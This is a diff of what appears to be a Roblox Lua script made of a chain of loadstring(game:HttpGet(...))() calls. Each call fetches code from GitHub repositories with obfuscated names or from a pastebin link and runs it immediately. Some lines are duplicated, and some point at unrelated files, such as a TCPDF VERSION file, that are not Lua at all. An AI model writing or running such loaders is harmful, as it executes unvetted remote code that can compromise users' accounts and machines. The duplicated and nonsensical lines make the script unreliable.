@@ -4,29 +4,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/dessalines/essays/mas
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/h3Ln23ezjvtvn-denRZqXliEyohI6l5K-QzOt6arJvewqfPsdrZJO-w6aevJKBl82XNjpM0d4v8XN27lSSNn3A-/main/1blacklist%20-%20Copy%20(27).lua"))(),
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/h3Ln23ezjvtvn-denRZqXliEyohI6l5K-QzOt6arJvewqfPsdrZJO-w6aevJKBl82XNjpM0d4v8XN27lSSNn3A-/main/2blacklist.lua"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/h3Ln23ezjvtvn-denRZqXliEyohI6l5K-QzOt6arJvewqfPsdrZJO-w6aevJKBl82XNjpM0d4v8XN27lSSNn3A-/main/2blacklist.lua"))(),
-
-loadstring(game:HttpGet("https://github.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/blob/main/1blacklist%20-%20Copy%20(24).lua"))(),
-
-loadstring(game:HttpGet("https://github.com/spoofy-raccoon/I0WFZa0D8qwR4xZFpwpWawI7WBPnqXkuPedC54tAKaNNht0iUfLVz35ubCOY76unC9BmVXgHKxEPV8Vy1g-XCA-/blob/main/1blacklist%20-%20Copy%20(11).lua"))(),
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/h3Ln23ezjvtvn-denRZqXliEyohI6l5K-QzOt6arJvewqfPsdrZJO-w6aevJKBl82XNjpM0d4v8XN27lSSNn3A-/main/1blacklist%20-%20Copy%20(10).lua"))(),
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/spoofy-raccoon/h3Ln23ezjvtvn-denRZqXliEyohI6l5K-QzOt6arJvewqfPsdrZJO-w6aevJKBl82XNjpM0d4v8XN27lSSNn3A-/main/1blacklist%20-%20Copy%20(10).lua"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tecnickcom/TCPDF/main/VERSION"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tecnickcom/TCPDF/main/VERSION"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tecnickcom/TCPDF/main/VERSION"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tecnickcom/TCPDF/main/VERSION"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tecnickcom/TCPDF/main/VERSION"))(),
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tecnickcom/TCPDF/main/VERSION"))(),
 
 loadstring(game:HttpGet("https://pastebin.com/vpnH7FmX"))(),
 
